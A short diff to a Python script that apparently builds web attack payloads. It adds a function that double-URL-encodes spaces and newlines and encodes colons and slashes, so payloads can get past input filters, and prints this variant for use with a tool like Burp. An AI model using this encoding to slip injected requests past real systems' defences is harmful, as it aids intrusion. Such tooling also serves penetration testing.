@@ -28,6 +28,15 @@ def double_url_encode_payload(data):
 
     return encoded_data
 
+
+def another_option(data):
+    # Encode the ':' Double encode the ' ' from `%20` to '%2520' characters
+    encoded_data = data.replace(':', '%3a').replace('/', '%2F').replace('%20', '%2520')
+    # Replace newline character from '%0a' to '%250a'
+    encoded_data = encoded_data.replace('%0a', '%250a')
+
+    return encoded_data
+
 def host_header(host):
     host_target = "Host: " + host
     return host_target
@@ -80,6 +89,8 @@ try:
     print(encoded_payload)
     print("\n[!] Double URL encoded payload:")
     print(double_url_encode_payload(encoded_payload))
+    print("\n[!] Another option that might work via something like BURP:")
+    print(another_option(encoded_payload))
 
 except KeyboardInterrupt:
     print("\n[!] Script interrupted by user. Exiting...")
